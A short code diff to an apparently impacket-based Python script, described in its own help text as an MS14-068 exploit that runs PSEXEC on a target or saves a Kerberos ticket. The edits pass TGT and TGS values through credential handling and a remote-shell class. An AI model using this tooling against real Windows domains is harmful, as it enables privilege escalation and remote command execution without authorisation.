@@ -430,7 +430,7 @@ class Pipes(Thread):
             lock.acquire()
             global dialect
             self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
-            user, passwd, domain, lm, nt, aesKey = self.credentials
+            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
             self.server.login(user, passwd, domain, lm, nt)
             lock.release()
             self.tid = self.server.connectTree('IPC$') 
@@ -503,7 +503,7 @@ class RemoteShell(cmd.Cmd):
 
     def connect_transferClient(self):
         self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
-        user, passwd, domain, lm, nt, aesKey = self.credentials
+        user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
         self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
 
     def do_help(self, line):
@@ -1090,7 +1090,7 @@ if __name__ == '__main__':
 
     print version.BANNER
 
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(add_help = True, description = "MS14-068 Exploit. It established an SMBConnection and PSEXEcs the target or saves the TGT for later use.")
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
     parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
